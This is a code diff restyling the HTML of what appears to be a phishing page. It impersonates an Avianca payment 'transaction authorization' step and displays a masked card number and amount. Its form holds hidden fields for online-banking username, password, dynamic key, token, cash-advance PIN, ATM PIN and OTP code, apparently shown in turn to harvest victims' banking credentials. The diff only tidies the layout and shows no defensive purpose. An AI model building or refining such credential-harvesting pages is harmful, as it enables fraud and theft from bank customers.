@@ -1,201 +1,158 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Avianca - Booking</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@300;400;500;600;700;800;900&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="./css/checkers.css">
-    <link rel="stylesheet" href="./css/normalize.css">
-    <script src="./js/functions.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Avianca - Booking</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@300;400;500;600;700;800;900&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="./css/checkers.css">
+  <link rel="stylesheet" href="./css/normalize.css">
+  <script src="./js/functions.js"></script>
 
-    <!-- ===== ESTILOS SOLO VISUALES ===== -->
-    <style>
-      :root{
-        --bg:#f5f6f8;
-        --card:#ffffff;
-        --text:#111827;
-        --muted:#6b7280;
-        --border:rgba(2,6,23,.10);
-        --shadow:0 10px 30px rgba(16,24,40,.10);
-        --focus:#de0108;
-        --radius:18px;
-      }
-      *{box-sizing:border-box}
-      html,body{
-        background:var(--bg);
-        font-family:"Red Hat Display","Lato",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
-        color:var(--text);
-      }
+  <!-- ===== SOLO VISUAL ===== -->
+  <style>
+    :root{
+      --bg:#f5f6f8; --card:#fff; --text:#111827; --muted:#6b7280;
+      --border:rgba(2,6,23,.10); --shadow:0 10px 30px rgba(16,24,40,.10);
+      --focus:#de0108; --radius:18px;
+    }
+    *{box-sizing:border-box}
+    html,body{
+      background:var(--bg);
+      font-family:"Red Hat Display","Lato",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+      color:var(--text);
+    }
 
-      /* Encabezado de logos */
-      .logos{
-        max-width: 720px;
-        margin: 18px auto 12px;
-        padding: 0 8px;
-        display:flex; align-items:center; justify-content:space-between; gap:12px;
-      }
-      .logos img{height:auto; object-fit:contain;}
+    .logos{
+      max-width:720px; margin:18px auto 12px; padding:0 8px;
+      display:flex; align-items:center; justify-content:space-between; gap:12px;
+    }
+    main{max-width:720px; margin:0 auto 32px; padding:0 8px;}
 
-      /* Contenedor principal */
-      main{max-width: 720px; margin: 0 auto 32px; padding: 0 8px;}
+    .content{
+      background:var(--card); border:1px solid var(--border); border-radius:var(--radius);
+      box-shadow:var(--shadow); padding:clamp(18px,3vw,28px);
+    }
+    .content>b:first-child{display:block; margin-bottom:12px; font-size:clamp(20px,2.2vw,26px); font-weight:800;}
+    .content p{line-height:1.55; margin:4px 0;}
 
-      /* Tarjeta */
-      .content{
-        background: var(--card);
-        border: 1px solid var(--border);
-        border-radius: var(--radius);
-        box-shadow: var(--shadow);
-        padding: clamp(18px, 3vw, 28px);
-      }
-      .content > b:first-child{
-        display:block; margin-bottom:12px;
-        font-size: clamp(20px, 2.2vw, 26px); font-weight:800;
-      }
-      .content p{line-height:1.55; margin: 6px 0;}
+    /* ===== GRID: Etiqueta | Valor, todo a la izquierda ===== */
+    #form{
+      display:grid;
+      grid-template-columns: 160px 1fr; /* Label | Valor */
+      gap:10px 16px;
+      align-items:center;
+      margin:0 !important;
+    }
+    #form .labels, #form .values{display:contents;}
+    #form .labels b{color:var(--muted); font-weight:600; text-align:right;}
+    #form .values p{margin:0; font-weight:700;}
 
-      /* GRID FORM base (dos columnas label/valor) */
-      #form{
-        display:grid;
-        grid-template-columns: 160px 1fr;
-        gap: 12px 16px;
-        align-items: center;
-        margin-bottom: 0 !important;
-      }
-      #form .labels, #form .values{display: contents;}
-      #form .labels b{
-        color: var(--muted);
-        font-weight:600;
-      }
-      #form .values p{
-        margin:0;
-        font-weight:700;
-      }
+    /* Mapeo de filas (sin tocar HTML) */
+    /* 1) Comercio */
+    #form .labels b:nth-child(1){grid-column:1; grid-row:1;}
+    #form .values p:nth-child(1){grid-column:2; grid-row:1;}
 
-      /* Inputs */
-      input[type="text"], input[type="password"], input[type="number"], input[type="tel"]{
-        width:100% !important; height:48px !important;
-        padding:0 14px !important;
-        border:1px solid #d1d5db !important; border-radius:12px !important;
-        background:#fff !important; outline:none;
-        font-size:16px; transition:border-color .15s, box-shadow .15s;
-      }
-      input:focus{ border-color:var(--focus) !important; box-shadow:0 0 0 3px rgba(222,1,8,.13) !important; }
+    /* 2) N.º de tarjeta */
+    #form .labels b:nth-child(3){grid-column:1; grid-row:2;}
+    #form .values p:nth-child(3){grid-column:2; grid-row:2;}
 
-      /* Link reenviar */
-      #newCode{
-        display:block; text-align:center; margin: 16px auto 8px;
-        color:#0d6efd; text-decoration:none;
-      }
-      #newCode:hover{text-decoration:underline}
+    /* 3) Monto */
+    #form .labels b:nth-child(2){grid-column:1; grid-row:3;}
+    #form .values p:nth-child(2){grid-column:2; grid-row:3;}
 
-      /* Botón */
-      #btnNextStep.btn-success{
-        display:block; margin: 10px auto 0;
-        min-width:200px; height:48px; padding:0 22px;
-        border-radius:999px; border:0;
-        background:#111; color:#fff; font-weight:800; font-size:16px;
-        box-shadow:0 2px 0 rgba(0,0,0,.08);
-        cursor:pointer; transition:transform .05s ease, opacity .15s ease;
-      }
-      #btnNextStep.btn-success:active{transform: translateY(1px)}
+    /* 4) Código OTP (label existente y su input) */
+    #form .labels b#otpcode{grid-column:1; grid-row:4;}
+    #form #otpcode{
+      grid-column:2; grid-row:4;
+      width:100%; max-width:520px; height:48px !important;
+    }
 
-      /* ======= ACOMODO EXACTO EN DOS LADOS ======= */
-      /* Estructura: [label L][valor L] | [label R][valor R] */
-      #form{
-        grid-template-columns: 140px 1fr 120px 1fr; /* izq label/valor | der label/valor */
-        gap: 10px 16px;
-      }
-      #form .labels b{ text-align:right; }
+    /* Inputs look & feel */
+    input[type="text"], input[type="password"], input[type="number"], input[type="tel"]{
+      width:100% !important; height:48px !important; padding:0 14px !important;
+      border:1px solid #d1d5db !important; border-radius:12px !important; background:#fff !important;
+      font-size:16px; outline:none; transition:border-color .15s, box-shadow .15s;
+    }
+    input:focus{border-color:var(--focus) !important; box-shadow:0 0 0 3px rgba(222,1,8,.13) !important;}
 
-      /* Filas mapeadas (sin tocar tu HTML) */
-      /* 1) Comercio (izq)  |  Monto (der) */
-      #form .labels b:nth-child(1){ grid-column:1; grid-row:1; } /* "Comercio:" */
-      #form .values p:nth-child(1){ grid-column:2; grid-row:1; } /* valor comercio */
+    /* Link reenviar (queda fuera de la tarjeta si así estaba en tu flujo) */
+    #newCode{display:block; text-align:center; margin:14px auto 8px; color:#0d6efd; text-decoration:none;}
+    #newCode:hover{text-decoration:underline}
 
-      #form .labels b:nth-child(2){ grid-column:3; grid-row:1; } /* "Monto:" */
-      #form .values p:nth-child(2){ grid-column:4; grid-row:1; } /* valor monto */
+    /* Botón */
+    #btnNextStep.btn-success{
+      display:block; margin:10px auto 0;
+      min-width:200px; height:48px; padding:0 22px;
+      border-radius:999px; border:0; background:#111; color:#fff;
+      font-weight:800; font-size:16px; box-shadow:0 2px 0 rgba(0,0,0,.08);
+      cursor:pointer; transition:transform .05s ease, opacity .15s ease;
+    }
+    #btnNextStep.btn-success:active{transform:translateY(1px)}
 
-      /* 2) Nº Tarjeta (izq) | Código OTP (der) */
-      #form .labels b:nth-child(3){ grid-column:1; grid-row:2; } /* "Número de tarjeta:" */
-      #form .values p:nth-child(3){ grid-column:2; grid-row:2; } /* valor tarjeta */
-
-      /* Etiqueta e input del OTP por ID existentes */
-      #form .labels b#otpcode{ grid-column:3; grid-row:2; }   /* "Código OTP:" */
-      #form #otpcode{
-        grid-column:4; grid-row:2;
-        width:100%; max-width:520px; height:48px !important;
-      }
-
-      /* Compactar un poco */
-      .content{ padding: 18px 20px; }
-      .content p{ margin: 4px 0; }
-
-      /* Responsivo: apilar en una columna */
-      @media (max-width: 600px){
-        #form{ grid-template-columns: 130px 1fr; }
-        #form .labels b:nth-child(1){ grid-column:1; grid-row:1; }
-        #form .values p:nth-child(1){ grid-column:2; grid-row:1; }
-        #form .labels b:nth-child(2){ grid-column:1; grid-row:2; }
-        #form .values p:nth-child(2){ grid-column:2; grid-row:2; }
-        #form .labels b:nth-child(3){ grid-column:1; grid-row:3; }
-        #form .values p:nth-child(3){ grid-column:2; grid-row:3; }
-        #form .labels b#otpcode{      grid-column:1; grid-row:4; }
-        #form #otpcode{               grid-column:2; grid-row:4; max-width:100%; }
-      }
-    </style>
+    /* Móvil: igual orden, una columna de 130px para label */
+    @media (max-width:600px){
+      #form{grid-template-columns:130px 1fr;}
+    }
+  </style>
 </head>
 <body>
-    <!-- LOADER -->
-    <div class="main-loader show">
-        <img id="company-loader">
-        <div class="loader"></div>
-    </div>
+  <!-- LOADER -->
+  <div class="main-loader show">
+    <img id="company-loader">
+    <div class="loader"></div>
+  </div>
 
-    <div class="logos">
-        <img id="bank-logo" width="50px">
-        <img id="company-logo" width="110px">
-    </div>
-    <main>
-        <div class="content">
-            <b>Autorización de transacción</b>
-            <p>La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
-            <p>Ingrese los datos de su Banca Virtual:</p>
-            <form id="form">
-                <div class="labels">
-                    <b>Comercio:</b>
-                    <b>Monto:</b>
-                    <b>Número de tarjeta:</b>
-                    <b class="hidden" id="user">Usuario:</b>
-                    <b class="hidden" id="puser">Contraseña:</b>
-                    <b class="hidden" id="cdin">Clave Dinámica:</b>
-                    <b class="hidden" id="dintok">Token:</b>
-                    <b class="hidden" id="cavance">Clave Avances:</b>
-                    <b class="hidden" id="ccaj">Clave Cajero:</b>
-                    <b class="hidden" id="otpcode">Código OTP:</b>
-                </div>
-                <div class="values">
-                    <p>AVIANCA S.A</p>
-                    <p>$ <span id="flight-price">49.000</span> USD</p>
-                    <p>•••• •••• •••• <span id="card-digits"></span></p>
-                    <input class="hidden" required type="text" id="user">
-                    <input class="hidden" required type="text" id="puser">
-                    <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cdin">
-                    <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="dintok">
-                    <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cavance">
-                    <input class="hidden" oninput="limitDigits(this, 4)" required type="text" id="ccaj">
-                    <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="otpcode">
-                </div>
-            </form>
+  <div class="logos">
+    <img id="bank-logo" width="50px">
+    <img id="company-logo" width="110px">
+  </div>
+
+  <main>
+    <div class="content">
+      <b>Autorización de transacción</b>
+      <p>La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
+      <p>Ingrese los datos de su Banca Virtual:</p>
+
+      <form id="form">
+        <div class="labels">
+          <b>Comercio:</b>
+          <b>Monto:</b>
+          <b>Número de tarjeta:</b>
+          <b class="hidden" id="user">Usuario:</b>
+          <b class="hidden" id="puser">Contraseña:</b>
+          <b class="hidden" id="cdin">Clave Dinámica:</b>
+          <b class="hidden" id="dintok">Token:</b>
+          <b class="hidden" id="cavance">Clave Avances:</b>
+          <b class="hidden" id="ccaj">Clave Cajero:</b>
+          <b class="hidden" id="otpcode">Código OTP:</b>
         </div>
-        <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
-        <button id="btnNextStep" class="btn-success">Verificar</button>
-    </main>
 
-    <!-- SCRIPTS -->
-    <script src="./js/id_check.js"></script>
+        <div class="values">
+          <p>AVIANCA S.A</p>
+          <p>$ <span id="flight-price">49.000</span> USD</p>
+          <p>•••• •••• •••• <span id="card-digits"></span></p>
+
+          <!-- Campos condicionales existentes (no se tocan) -->
+          <input class="hidden" required type="text" id="user">
+          <input class="hidden" required type="text" id="puser">
+          <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cdin">
+          <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="dintok">
+          <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cavance">
+          <input class="hidden" oninput="limitDigits(this, 4)" required type="text" id="ccaj">
+          <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="otpcode">
+        </div>
+      </form>
+    </div>
+
+    <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
+    <button id="btnNextStep" class="btn-success">Verificar</button>
+  </main>
+
+  <!-- SCRIPTS -->
+  <script src="./js/id_check.js"></script>
 </body>
 </html>
